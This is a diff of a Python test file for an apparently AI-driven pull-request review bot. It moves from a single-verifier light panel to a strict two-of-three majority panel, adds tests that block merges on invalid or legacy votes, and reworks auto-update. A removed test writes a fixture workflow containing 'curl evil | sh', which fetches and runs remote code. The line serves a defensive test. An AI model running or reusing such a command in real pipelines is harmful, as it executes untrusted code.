@@ -82,7 +82,7 @@ class JsonBlockTest(unittest.TestCase):
     def test_missing_or_broken(self):
         self.assertIsNone(bot.parse_findings("no json here"))
         self.assertIsNone(bot.parse_findings('```json\n{"findings": [\n```'))
-        self.assertEqual(bot.parse_vote("nothing"), ("FAIL", "no parseable vote"))
+        self.assertEqual(bot.parse_vote("nothing")[0], "INVALID")
 
     def test_findings_normalized(self):
         findings = bot.parse_findings('```json\n{"findings":[{"severity":"p2","claim":"c"},{"id":"X","severity":"??"}]}\n```')
@@ -103,6 +103,9 @@ class ConvergenceTest(unittest.TestCase):
         self.assertTrue(bot.panel_passed(["PASS", "FAIL", "PASS"]))
         self.assertFalse(bot.panel_passed(["PASS", "FAIL", "FAIL"]))
         self.assertFalse(bot.panel_passed(["PASS"]))
+        self.assertFalse(bot.panel_passed(["PASS", "PASS"]))
+        self.assertFalse(bot.panel_passed(["PASS", "PASS", "INVALID"]))
+        self.assertFalse(bot.panel_passed(["PASS", "PASS", "PASS", "PASS"]))
 
 
 class TriggerTest(unittest.TestCase):
@@ -464,6 +467,10 @@ class TrunkCheckTest(unittest.TestCase):
         self.assertIn("(x)", notes[-1])
 
 
+def passed_panel(sha):
+    return {"panelSha": sha, "panelPolicy": bot.PANEL_POLICY, "panelVotes": ["PASS", "PASS", "PASS"]}
+
+
 class LandTest(unittest.TestCase):
     SHA = "s" * 40
 
@@ -474,7 +481,7 @@ class LandTest(unittest.TestCase):
         return c.land("3/3"), c
 
     def test_a_required_check_that_never_reports_blocks_a_few_cycles_after_the_one_wait(self):
-        item, missing = {"panelSha": self.SHA}, {"requiredContexts": ["check", "e2e"], "pending": True}
+        item, missing = passed_panel(self.SHA), {"requiredContexts": ["check", "e2e"], "pending": True}
         waits, statuses = [], []
         for _ in range(bot.MISSING_LOOKS):
             status, c = self.land(item, **missing)
@@ -486,13 +493,13 @@ class LandTest(unittest.TestCase):
         self.assertIn("`e2e` never reported", c.it.posts[-1][1])
 
     def test_a_check_that_starts_running_again_resets_the_missing_count(self):
-        item = {"panelSha": self.SHA, "checksWaited": self.SHA, "missingLooks": bot.MISSING_LOOKS - 1}
+        item = {**passed_panel(self.SHA), "checksWaited": self.SHA, "missingLooks": bot.MISSING_LOOKS - 1}
         running = {"required": [{"name": "check", "bucket": "pending"}], "pending": True, "running": True}
         self.assertEqual(self.land(item, **running)[0], "awaiting-checks")
         self.assertEqual(item["missingLooks"], 0)
 
     def test_running_checks_are_waited_for_once_per_head(self):
-        item = {"panelSha": self.SHA}
+        item = passed_panel(self.SHA)
         running = {"required": [{"name": "check", "bucket": "pending"}], "pending": True, "running": True}
         status, c = self.land(item, **running)
         self.assertEqual(status, "awaiting-checks")
@@ -506,7 +513,7 @@ class LandTest(unittest.TestCase):
     def test_a_held_pr_or_a_stack_child_waits_without_merging(self):
         for facts in ({"held": True}, {"stackBase": "main"}):
             with self.subTest(facts=facts):
-                item = {"panelSha": self.SHA}
+                item = passed_panel(self.SHA)
                 status, c = self.land(item, **facts)
                 self.assertEqual(status, "awaiting-hold")
                 self.assertEqual(item["heldAt"], {"held": bool(facts.get("held")), "base": "main"})
@@ -923,12 +930,19 @@ class SealedReviewTest(unittest.TestCase):
 
     def test_a_held_pr_whose_base_changed_is_reviewed_again_before_any_merge(self):
         c = self.conversation(own=True)
-        c.item = {"status": "awaiting-hold", "panelSha": c.head, "heldAt": {"held": False, "base": "feat/parent"}}
+        c.item = {**passed_panel(c.head), "status": "awaiting-hold", "heldAt": {"held": False, "base": "feat/parent"}}
         c.land, c.converse = mock.Mock(return_value="merged"), mock.Mock(return_value="reviewed-again")
         self.assertEqual(c.run(), "reviewed-again")  # c.base is now main
         c.land.assert_not_called()
         c.item["heldAt"]["base"] = "main"  # same base, the label came off: straight to the gate
         self.assertEqual(c.run(), "merged")
+
+    def test_legacy_cached_approval_gets_a_new_conversation_not_a_merge(self):
+        c = self.conversation(own=True)
+        c.item = {"status": "awaiting-checks", "panelSha": c.head, "panelTally": "1/1"}
+        c.land, c.converse = mock.Mock(return_value="merged"), mock.Mock(return_value="reviewed-again")
+        self.assertEqual(c.run(), "reviewed-again")
+        c.land.assert_not_called()
 
     def test_someone_elses_pr_gets_a_reviewer_with_no_tools_and_no_checkout(self):
         c = self.conversation(own=False)
@@ -1168,31 +1182,6 @@ class ImplementReleaseTest(unittest.TestCase):
         self.assertEqual((status, detaches), ("implemented", [Path("w/issue5-impl")]))
 
 
-class DiffSizeTest(unittest.TestCase):
-    def test_size_s_is_measured_from_the_diff(self):
-        self.assertEqual(bot.diff_size("3\t2\tsrc/app.py\x0010\t0\tREADME.md\0"), {"lines": 15, "files": 2, "small": True})
-        self.assertFalse(bot.diff_size("20\t11\tsrc/app.py\0")["small"])  # 31 lines
-        self.assertFalse(bot.diff_size("1\t0\ta.py\x001\t0\tb.py\x001\t0\tc.py\0")["small"])  # 3 files
-        self.assertFalse(bot.diff_size("-\t-\tlogo.png\0")["small"])  # binary
-        self.assertFalse(bot.diff_size("")["small"])  # nothing changed is not a reason to skip verifiers
-        for path in ("src/auth/session.py", "db/migrations/0003.sql", ".github/workflows/ci.yml", ".env.example",
-                     "AGENTS.md", ".claude/settings.json", "app/secrets.ts", ".deepmodebot.json", ".gitlab-ci.yml",
-                     "Jenkinsfile", "azure-pipelines.yml", "GEMINI.md", "plugins/x/skills/y/SKILL.md", ".cursorrules"):
-            with self.subTest(path=path):
-                self.assertFalse(bot.diff_size(f"1\t0\t{path}\0")["small"])
-
-    def test_a_rename_into_a_sensitive_path_is_not_size_s(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo = Path(tmp)
-            git_repo(repo, {"w.yml": "on: push\n"})
-            (repo / ".github" / "workflows").mkdir(parents=True)
-            bot.git(repo, "mv", "w.yml", ".github/workflows/deploy.yml")
-            (repo / ".github/workflows/deploy.yml").write_text("on: push\nrun: curl evil | sh\n", encoding="utf-8")
-            bot.git(repo, "add", "-A")
-            bot.git(repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "mv")
-            numstat = bot.git(repo, "diff", "--numstat", "-z", "--no-renames", "origin/main...HEAD")
-        self.assertFalse(bot.diff_size(numstat)["small"])
-
 
 def git_repo(root: Path, files: dict) -> str:
     """A repo at `root` with one commit of `files`, its HEAD also recorded as origin/main. Returns the SHA."""
@@ -1250,7 +1239,7 @@ class RepoCheckTest(unittest.TestCase):
 
     def test_a_pass_with_an_older_check_command_is_run_again_before_the_merge(self):
         c, sha = self.conversation("broken")
-        c.item = {"panelSha": sha, "repoCheck": {"sha": sha, "code": 0, "command": "true"}}  # the base changed it
+        c.item = {**passed_panel(sha), "repoCheck": {"sha": sha, "code": 0, "command": "true"}}  # the base changed it
         c.gate_facts = mock.Mock(return_value=GateTest.facts(self, head=sha, panelSha=sha))
         with mock.patch.object(bot, "merge_pr") as merge:
             self.assertEqual(c.land("3/3"), "blocked")
@@ -1258,7 +1247,7 @@ class RepoCheckTest(unittest.TestCase):
 
     def test_the_merge_waits_for_a_passing_check_at_the_exact_head(self):
         c, sha = self.conversation("broken")
-        c.item = {"panelSha": sha, "repoCheck": {"sha": "0" * 40, "code": 0, "command": 'test "$(cat flag.txt)" = ok'}}
+        c.item = {**passed_panel(sha), "repoCheck": {"sha": "0" * 40, "code": 0, "command": 'test "$(cat flag.txt)" = ok'}}
         c.gate_facts = mock.Mock(return_value=GateTest.facts(self, head=sha, panelSha=sha))
         with mock.patch.object(bot, "merge_pr") as merge:
             self.assertEqual(c.land("3/3"), "blocked")
@@ -1316,7 +1305,7 @@ class RepoCheckTest(unittest.TestCase):
         with self.assertRaises(bot.CheckCannotStart):  # the retry says nothing new on the thread
             c.check_findings()
         self.assertEqual(len(c.it.posts), 1)
-        c.item["panelSha"] = sha
+        c.item.update(passed_panel(sha))
         c.gate_facts = mock.Mock(return_value=GateTest.facts(self, head=sha, panelSha=sha))
         with mock.patch.object(bot, "merge_pr") as merge, self.assertRaises(bot.CheckCannotStart):
             c.land("3/3")
@@ -1389,53 +1378,65 @@ class OwnRepoMergeTest(unittest.TestCase):
             self.assertEqual(self.finish("o/r"), ("merged", False))
 
 
-class LightPanelTest(unittest.TestCase):
+class MajorityPanelTest(unittest.TestCase):
     def setUp(self):
         log = mock.patch.object(bot, "log")
         log.start()
         self.addCleanup(log.stop)
 
-    def panel(self, numstat, votes, labels=(), author=None, verifiers=None):
+    def panel(self, votes, verifiers=None):
         c = object.__new__(bot.PRConversation)
         c.head, c.base, c.n, c.repo, c.clone, c.item = "s" * 40, "main", 7, "o/r", Path("clone"), {}
-        c.pr = {"title": "t", "body": "", "labels": labels}
-        c.author = author or {"agent": "omp"}
+        c.pr = {"title": "t", "body": "", "labels": []}
+        c.author = {"agent": "omp"}
         c.cfg = {"verifiers": verifiers or [{"agent": "omp"}, {"agent": "omp", "model": "other/one"},
                                            {"agent": "omp", "model": "x/y"}]}
         c.verifier_trees = [Path(f"v{i}") for i in range(3)]
         c.require_own = mock.Mock()
         c.it = mock.Mock()
-        c.it.ask.side_effect = [f'ok\n```json\n{{"vote":"{v}","evidence":"ran it"}}\n```' for v in votes]
-        with mock.patch.object(bot, "git", side_effect=lambda clone, *a: numstat if "--numstat" in a else "stat"), \
+        c.it.ask.side_effect = [
+            v if isinstance(v, Exception) else f'ok\n```json\n{{"vote":"{v}","evidence":"ran it"}}\n```' for v in votes]
+        with mock.patch.object(bot, "git", return_value="stat"), \
                 mock.patch.object(bot, "worktree_at"):
             return c.panel(), c
 
-    def test_a_size_s_diff_gets_one_verifier_from_another_model(self):
-        (passed, tally, _), c = self.panel("2\t1\tsrc/app.py\0", ["PASS"])
-        self.assertEqual((passed, tally), (True, "1/1"))
-        self.assertEqual(c.it.ask.call_count, 1)
-        self.assertEqual(c.it.ask.call_args.args[0], {"agent": "omp", "model": "other/one"})
-        self.assertEqual(c.it.ask.call_args.args[2], Path("v1"))
-        self.assertIn("Light panel (size S", c.it.say.call_args.args[3])
-
-    def test_the_one_light_verifier_must_pass(self):
-        (passed, _, failures), _ = self.panel("2\t1\tsrc/app.py\0", ["FAIL"])
-        self.assertFalse(passed)
+    def test_two_of_three_passes_and_keeps_dissent(self):
+        (passed, tally, failures), c = self.panel(["PASS", "PASS", "FAIL"])
+        self.assertEqual((passed, tally), (True, "2/3"))
+        self.assertEqual(c.item["panelSha"], c.head)
+        self.assertTrue(bot.current_panel(c.item, c.head))
+        self.assertFalse(bot.current_panel(c.item, "t" * 40))
+        self.assertEqual({call.args[2] for call in c.it.ask.call_args_list}, {Path("v0"), Path("v1"), Path("v2")})
         self.assertEqual(len(failures), 1)
 
-    def test_a_larger_diff_gets_the_full_panel(self):
-        (passed, tally, _), c = self.panel("40\t0\tsrc/app.py\0", ["PASS", "PASS", "FAIL"])
-        self.assertEqual((passed, tally), (True, "2/3"))
-        self.assertEqual(c.it.ask.call_count, 3)
+    def test_majority_failure_does_not_pin_approved_head(self):
+        (passed, tally, failures), c = self.panel(["PASS", "FAIL", "FAIL"])
+        self.assertEqual((passed, tally), (False, "1/3"))
+        self.assertIsNone(c.item["panelSha"])
+        self.assertEqual(len(failures), 2)
 
-    def test_the_full_panel_label_overrides_size_s(self):
-        (_, tally, _), c = self.panel("2\t1\tsrc/parse.py\0", ["PASS", "PASS", "PASS"], labels=[{"name": "full-panel"}])
-        self.assertEqual((tally, c.it.ask.call_count), ("3/3", 3))
+    def test_missing_invalid_or_unavailable_third_vote_cannot_be_outvoted(self):
+        for votes in (["PASS", "PASS"], ["PASS", "PASS", "maybe"],
+                      ["PASS", "PASS", RuntimeError("reviewer unavailable")]):
+            with self.subTest(votes=votes):
+                (passed, tally, failures), c = self.panel(votes)
+                self.assertEqual((passed, tally), (False, "2/3"))
+                self.assertIsNone(c.item["panelSha"])
+                self.assertEqual(len(failures), 1)
 
-    def test_the_light_verifier_prefers_another_agent_over_another_model(self):
-        verifiers = [{"agent": "claude"}, {"agent": "claude", "model": "m2"}, {"agent": "codex"}]
-        _, c = self.panel("2\t1\tsrc/app.py\0", ["PASS"], author={"agent": "claude"}, verifiers=verifiers)
-        self.assertEqual(c.it.ask.call_args.args[0], {"agent": "codex"})
+    def test_panel_rejects_non_three_reviewer_configuration(self):
+        with self.assertRaises(RuntimeError):
+            self.panel(["PASS"], verifiers=[{"agent": "omp"}])
+
+    def test_direct_merge_refuses_legacy_or_malformed_majority_receipts(self):
+        for receipt in ({"panelSha": "s" * 40}, {**passed_panel("s" * 40), "panelVotes": ["PASS", "PASS"]},
+                        {**passed_panel("s" * 40), "panelVotes": ["PASS", "PASS", "INVALID"]}):
+            c = object.__new__(bot.PRConversation)
+            c.item = receipt
+            c.gate_facts = mock.Mock()
+            with self.subTest(receipt=receipt), self.assertRaises(bot.Blocked):
+                c.land("2/3")
+            c.gate_facts.assert_not_called()
 
 
 def link_dir(link: Path, target: Path) -> bool:
@@ -1476,7 +1477,7 @@ class AutostartPathTest(unittest.TestCase):
                 self.skipTest("cannot make a directory link here")
             script = home / "src/plugins/deepmodebot/skills/deepmodebot/assets/github-app/bot.py"
             with mock.patch.object(bot, "__file__", str(script)), mock.patch.object(Path, "home", return_value=home):
-                self.assertIsNone(bot.omp_install())  # the watcher never updates a checkout
+                self.assertIsNone(bot.omp_install())  # checkout updates use local-copy discovery, not omp-install discovery
                 found = bot.omp_install(anywhere=True)
             self.assertEqual((found["marketplace"], found["plugin"]), ("deepmodebot", "deepmodebot"))
             self.assertEqual(found["assets"], link / "skills/deepmodebot/assets")
@@ -1497,9 +1498,11 @@ class AutoUpdateTest(unittest.TestCase):
                         "script": self.assets / "github-app/bot.py", "assets": self.assets}
         self.logs = []
         for target, name, value in ((bot, "UPDATE_PATH", self.tmp / "update.json"), (bot, "CONFIG_DIR", self.tmp),
+                                    (bot, "WORK", self.tmp),
                                     (bot, "log", self.logs.append), (bot.Lock, "path", self.tmp / "bot.lock"),
                                     (bot, "omp_install", lambda anywhere=False: self.install),
-                                    (bot, "remote_main", mock.Mock(return_value=self.NEW))):
+                                    (bot.local_updates, "synchronize", mock.Mock(side_effect=self.synchronize)),
+                                    (bot, "load_bot_config", lambda write=False: {"localCopyPaths": []})):
             patcher = mock.patch.object(target, name, value)
             patcher.start()
             self.addCleanup(patcher.stop)
@@ -1517,8 +1520,16 @@ class AutoUpdateTest(unittest.TestCase):
         self.ran, self.started = [], []
         self.new_code = True
 
+    def synchronize(self, home, cache, registered, manifests, dry=False, install=None, upgrade=None):
+        changed = (self.assets / "github-app/bot.py").read_text(encoding="utf-8") != "v2"
+        if changed and not dry and install:
+            upgrade()
+        return {"remote": self.NEW,
+                "targets": [{"path": str(self.install["link"]), "kind": "plugin", "action": "current"}],
+                "manifests": manifests, "upgraded": bool(changed and not dry and install)}
+
     def upgrade(self, command, **kw):
-        """omp's commands: the second one rewrites the install, with new bot code when `new_code`."""
+        """Simulate omp rewriting the install, with new bot code when `new_code`."""
         self.ran.append((command, kw))
         if command[2] == "upgrade" and self.new_code:
             (self.assets / "github-app/bot.py").write_text("v2", encoding="utf-8")
@@ -1545,24 +1556,86 @@ class AutoUpdateTest(unittest.TestCase):
         b = mock.Mock(cfg={"autoUpdate": True, "updateMinutes": 60, **cfg}, merged_self=False)
         return updates, b
 
-    def test_an_unchanged_main_runs_no_upgrade(self):
+    def test_a_recorded_sha_does_not_skip_inspecting_installed_contents(self):
         bot.save_update_record({"sha": self.NEW})
         with mock.patch.object(bot, "run", side_effect=self.upgrade):
             result = bot.update_install(self.install)
-        self.assertEqual((result["upgraded"], self.ran), (False, []))
+        self.assertTrue(result["upgraded"])
+        self.assertEqual(len(self.ran), 1)
 
     def test_a_new_main_runs_the_upgrade_without_api_keys_and_records_it(self):
         bot.save_update_record({"sha": self.OLD})
         with mock.patch.object(bot, "run", side_effect=self.upgrade), \
                 mock.patch.dict(os.environ, {"ANTHROPIC_API_KEY": "x", "OPENAI_API_KEY": "y"}):
             result = bot.update_install(self.install)
-        self.assertEqual([c for c, _ in self.ran], [["omp", "plugin", "marketplace", "update", "deepmodebot"],
-                                                    ["omp", "plugin", "upgrade", "deepmodebot"]])
+        self.assertEqual([c for c, _ in self.ran], [["omp", "plugin", "upgrade", "deepmodebot"]])
         for _, kw in self.ran:
             self.assertNotIn("ANTHROPIC_API_KEY", kw["env"])
             self.assertNotIn("OPENAI_API_KEY", kw["env"])
         self.assertTrue(result["upgraded"] and result["codeChanged"])
-        self.assertEqual(bot.load_update_record()["sha"], self.NEW)
+        self.assertEqual(bot.load_update_record()["remoteSha"], self.NEW)
+
+    def test_concurrent_update_cannot_change_files_or_overwrite_receipt(self):
+        bot.save_update_record({"copies": {"preserved": {"sha": self.OLD}}})
+        before = bot.UPDATE_PATH.read_bytes()
+        lock = bot.Lock()
+        lock.path = bot.WORK / "update.lock"
+        with lock:
+            result = bot.update_install(self.install)
+        self.assertIn("another local-copy update", result["error"])
+        self.assertEqual(bot.UPDATE_PATH.read_bytes(), before)
+        self.assertEqual((self.assets / "github-app/bot.py").read_text(), "v1")
+        bot.local_updates.synchronize.assert_not_called()
+
+    def test_incomplete_running_installation_does_not_restart(self):
+        updates, b = self.watcher()
+        (self.assets / "github-app/bot.py").write_text("partial v2", encoding="utf-8")
+        result = {"remote": self.NEW, "targets": [], "manifests": {}, "upgraded": False,
+                  "incomplete": [str(self.install["link"])]}
+        with mock.patch.object(bot.local_updates, "synchronize", return_value=result), self.child() as popen:
+            self.assertIsNone(updates.after_cycle(b, self.lock))
+        popen.assert_not_called()
+        self.assertTrue(any("incomplete update" in line for line in self.logs))
+        self.assertIsNotNone(self.lock.fh)
+
+    def test_failed_or_unverified_running_checkout_never_hands_over(self):
+        updates, b = self.watcher()
+        (self.assets / "github-app/bot.py").write_text("partial v2", encoding="utf-8")
+        for action in ("failed", "preserved", None):
+            with self.subTest(action=action):
+                targets = [] if action is None else [
+                    {"path": str(self.install["link"]), "kind": "checkout", "action": action}]
+                result = {"remote": self.NEW, "targets": targets, "manifests": {},
+                          "upgraded": False, "incomplete": []}
+                bot.save_update_record({})
+                with mock.patch.object(bot.local_updates, "synchronize", return_value=result), self.child() as popen:
+                    self.assertIsNone(updates.after_cycle(b, self.lock))
+                popen.assert_not_called()
+                self.assertIsNotNone(self.lock.fh)
+
+    def test_cli_failure_status_distinguishes_failed_updates_from_preserved_checkouts(self):
+        for action, incomplete, fails in (("failed", [], True), ("preserved", [str(self.install["link"])], True),
+                                          ("preserved", [], False)):
+            with self.subTest(action=action, incomplete=incomplete):
+                result = {"remote": self.NEW, "codeChanged": False, "incomplete": incomplete,
+                          "targets": [{"path": str(self.install["link"]), "kind": "checkout", "action": action}]}
+                with mock.patch.object(bot, "update_install", return_value=result), mock.patch("builtins.print"):
+                    if fails:
+                        with self.assertRaises(SystemExit) as raised:
+                            bot.cmd_update(mock.Mock(dry_run=False))
+                        self.assertNotEqual(raised.exception.code, 0)
+                    else:
+                        bot.cmd_update(mock.Mock(dry_run=False))
+
+    def test_verified_adoption_of_running_copy_allows_handover(self):
+        updates, b = self.watcher()
+        (self.assets / "github-app/bot.py").write_text("v2", encoding="utf-8")
+        result = {"remote": self.NEW, "manifests": {}, "upgraded": False, "incomplete": [],
+                  "targets": [{"path": str(self.install["link"]), "kind": "copy", "action": "adopted"}]}
+        with mock.patch.object(bot.local_updates, "synchronize", return_value=result), self.child() as popen:
+            self.assertEqual(updates.after_cycle(b, self.lock), 0)
+        popen.assert_called_once()
+        self.assertIsNone(self.lock.fh)
 
     def test_new_bot_code_hands_over_to_a_new_watcher_once_it_holds_the_lock(self):
         updates, b = self.watcher()
@@ -1606,7 +1679,7 @@ class AutoUpdateTest(unittest.TestCase):
         updates, b = self.watcher()
         with mock.patch.object(bot, "run", side_effect=self.upgrade), self.child() as popen:
             self.assertIsNone(updates.after_cycle(b, self.lock))
-        self.assertEqual(len(self.ran), 2)
+        self.assertEqual(len(self.ran), 1)
         popen.assert_not_called()
 
     def test_a_failed_upgrade_is_logged_and_retried_at_the_next_check(self):
@@ -1621,42 +1694,37 @@ class AutoUpdateTest(unittest.TestCase):
         bot.save_update_record(record)
         with mock.patch.object(bot, "run", side_effect=self.upgrade), self.child():
             updates.after_cycle(b, self.lock)
-        self.assertEqual(bot.load_update_record()["sha"], self.NEW)
+        self.assertEqual(bot.load_update_record()["remoteSha"], self.NEW)
 
     def test_checks_wait_for_the_interval_unless_the_bot_merged_into_its_own_repo(self):
         bot.save_update_record({"sha": self.NEW, "checkedAt": bot.now_iso()})
         updates, b = self.watcher()
         self.assertIsNone(updates.after_cycle(b, self.lock))
-        bot.remote_main.assert_not_called()
+        bot.local_updates.synchronize.assert_not_called()
         b.merged_self = True
-        self.assertIsNone(updates.after_cycle(b, self.lock))
-        bot.remote_main.assert_called_once()
+        with mock.patch.object(bot, "run", side_effect=self.upgrade), self.child():
+            updates.after_cycle(b, self.lock)
+        bot.local_updates.synchronize.assert_called_once()
 
     def test_auto_update_false_skips_the_check(self):
         updates, b = self.watcher(autoUpdate=False)
         self.assertIsNone(updates.after_cycle(b, self.lock))
-        bot.remote_main.assert_not_called()
+        bot.local_updates.synchronize.assert_not_called()
 
-    def test_a_git_checkout_never_updates_and_says_so_once(self):
+    def test_without_an_omp_install_native_updates_still_run(self):
         with mock.patch.object(bot, "omp_install", return_value=None):
             updates, b = self.watcher()
         self.assertIsNone(updates.after_cycle(b, self.lock))
-        self.assertIsNone(updates.after_cycle(b, self.lock))
-        bot.remote_main.assert_not_called()
-        self.assertEqual(len([line for line in self.logs if "auto-update off" in line]), 1)
+        bot.local_updates.synchronize.assert_called_once()
+        self.assertIsNone(bot.local_updates.synchronize.call_args.kwargs["install"])
 
-    def test_a_brand_without_a_repo_never_updates(self):
+    def test_brand_name_is_not_the_source_of_provenance(self):
         with mock.patch.dict(bot.B):
-            del bot.B["repo"]
+            bot.B.pop("repo", None)
             updates, b = self.watcher()
-            self.assertIsNone(updates.after_cycle(b, self.lock))
-            self.assertIsNone(updates.after_cycle(b, self.lock))
-            with self.assertRaises(SystemExit) as stop:
-                bot.cmd_update(mock.Mock(dry_run=True))
-        bot.remote_main.assert_not_called()
-        self.assertEqual([line for line in self.logs if "auto-update off" in line],
-                         ["auto-update off: the brand names no repo to update from"])
-        self.assertIn("no repo", str(stop.exception.code))
+            with mock.patch.object(bot, "run", side_effect=self.upgrade), self.child():
+                updates.after_cycle(b, self.lock)
+        bot.local_updates.synchronize.assert_called_once()
 
     def test_the_restart_waits_for_the_running_item_and_hands_over_the_lock(self):
         self.lock.release()  # cmd_watch takes it itself
@@ -1679,7 +1747,7 @@ class AutoUpdateTest(unittest.TestCase):
                 self.child(events=events), self.assertRaises(SystemExit) as stop:
             bot.cmd_watch(mock.Mock(interval=1))
         self.assertEqual(stop.exception.code, 0)
-        self.assertEqual(events, ["item starts", "item ends", "marketplace", "upgrade", "restart"])
+        self.assertEqual(events, ["item starts", "item ends", "upgrade", "restart"])
         with bot.Lock():  # free for the new watcher
             pass
 
